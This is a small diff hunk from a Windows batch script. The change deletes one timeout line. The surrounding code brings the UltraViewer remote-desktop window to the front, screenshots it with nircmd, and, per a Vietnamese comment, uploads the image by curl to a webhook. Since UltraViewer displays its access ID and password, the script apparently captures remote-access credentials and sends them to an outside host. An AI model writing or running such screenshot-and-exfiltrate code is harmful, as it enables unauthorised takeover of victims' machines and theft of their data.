@@ -25,8 +25,6 @@ timeout /t 10 >nul
 
 nircmd.exe win -top ititle "UltraViewer"
 
-timeout /t 2 >nul
-
 nircmd.exe savescreenshot "%SCREENSHOT_PATH%"
 :: Gửi ảnh lên webhook bằng curl
 curl -X POST "%WEBHOOK_URL%" -H "Content-Type: multipart/form-data" ^
